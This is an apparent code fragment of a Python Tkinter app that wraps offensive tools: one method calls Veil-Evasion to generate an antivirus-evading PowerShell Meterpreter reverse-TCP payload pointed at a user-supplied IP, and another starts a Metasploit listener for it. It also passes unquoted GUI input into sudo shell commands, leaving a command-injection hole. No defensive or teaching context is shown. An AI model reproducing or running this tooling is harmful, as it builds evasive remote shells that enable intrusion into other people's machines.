...
class App():
    ...
    def payload_generate(self):
        # Command line
        payload_command = subprocess.run(f"sudo veil -t evasion -p powershell/meterpreter/rev_tcp.py -o {self.remote_access_entry_name.get()} --ip {self.remote_access_entry_ip.get()} ", shell=True, capture_output=True)

        # payload path
        path = tk.Label(self.frame_2, text=f"/var/lib/veil/output/source/{self.remote_access_entry_name.get()} ", **self.style_basic)
        path.grid(row=0, column=2, pady=10, padx=20, sticky="W")

    def listner_start(self):
        # Command line
        listner_command = subprocess.Popen(f"sudo msfconsole --resource /var/lib/veil/output/handlers/{self.remote_access_entry_name.get()}.rc", shell=True)
